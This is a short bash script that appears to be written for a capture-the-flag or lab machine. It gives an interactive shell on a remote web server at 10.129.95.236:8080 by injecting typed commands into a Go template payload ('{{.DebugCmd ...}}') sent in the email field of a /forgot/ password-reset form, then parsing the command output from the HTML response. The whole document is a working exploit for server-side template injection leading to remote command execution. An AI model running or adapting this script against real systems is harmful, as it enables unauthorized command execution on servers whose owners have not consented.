#!/bin/bash

echo "Interactive shell ready. Type commands or 'exit' to quit."

while true; do
    # Display prompt
    echo -n "gobox> "
    
    # Read user input
    read cmd
    
    # Check for exit command
    if [ "$cmd" = "exit" ]; then
        echo "Exiting..."
        break
    fi
    
    # Escape double quotes in command
    cmd=${cmd//\"/\\\"}
    
    # Show the exact payload being sent
    echo "[DEBUG] Sending payload: {{.DebugCmd \"$cmd\"}}"
    
    # Store full response in a variable
    full_response=$(curl -s "http://10.129.95.236:8080/forgot/" \
        -d "email={{.DebugCmd \"$cmd\"}}")
    
    # Print full response for debugging
    echo "[DEBUG] Full response:"
    echo "$full_response"
    
    # Try to extract the command output
    response=$(echo "$full_response" | grep -oP "Email Sent To: \K.*?(?=\s+<button)" || echo "No match found")
    
    echo "[DEBUG] Extracted response: $response"
    echo "---------------------"
    echo "Command output:"
    echo "$response"
done